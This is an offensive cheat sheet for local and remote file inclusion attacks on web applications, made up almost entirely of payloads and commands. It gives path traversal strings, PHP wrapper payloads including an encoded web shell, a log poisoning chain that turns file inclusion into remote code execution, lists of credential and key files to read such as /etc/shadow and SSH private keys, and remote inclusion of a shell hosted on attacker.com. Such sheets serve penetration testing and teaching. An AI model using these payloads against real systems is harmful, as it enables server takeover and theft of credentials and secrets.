# LFI / RFI — Local & Remote File Inclusion

**CWE:** CWE-22 (Path Traversal), CWE-98 (RFI)

---

## Detection

```bash
# Vulnerable parameters
?file=, ?page=, ?template=, ?path=, ?include=, ?view=, ?module=

# Quick test
?file=../../../../etc/passwd
?file=../../../windows/win.ini

# Automated with ffuf
ffuf -u "https://target.com/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fw 0
```

---

## Payloads

```bash
# Basic traversal
../../../../etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    # Double URL encode

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Windows targets
..\..\..\windows\win.ini
..\..\..\..\boot.ini
C:/Windows/System32/drivers/etc/hosts

# PHP wrappers (LFI → Source Code Disclosure)
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/var/www/html/config.php
php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd

# PHP input (LFI → RCE with POST data)
php://input
# POST body: <?php system($_GET['cmd']); ?>

# Data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (RCE if enabled)
expect://id
```

---

## LFI → RCE via Log Poisoning

```bash
# Step 1: Inject PHP code into Apache access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 2: Include the log file
https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id

# Other log files to target:
/var/log/nginx/access.log
/var/log/auth.log           # Poisonable via SSH username
/proc/self/environ          # PHP env injection
/var/mail/www-data          # If email functionality exists
```

---

## Interesting Files to Read

```bash
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/home/USER/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env

# Windows
C:/Windows/win.ini
C:/boot.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config
C:/xampp/htdocs/config.php
```

---

## RFI (Remote File Inclusion)

```bash
# Only works when allow_url_include=On in php.ini (rare in modern PHP)

# Host PHP shell
python3 -m http.server 8080
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Inject
?file=http://attacker.com/shell.txt&cmd=id
?file=https://attacker.com/shell.txt
?file=\\attacker.com\share\shell.txt   # Windows UNC path
```
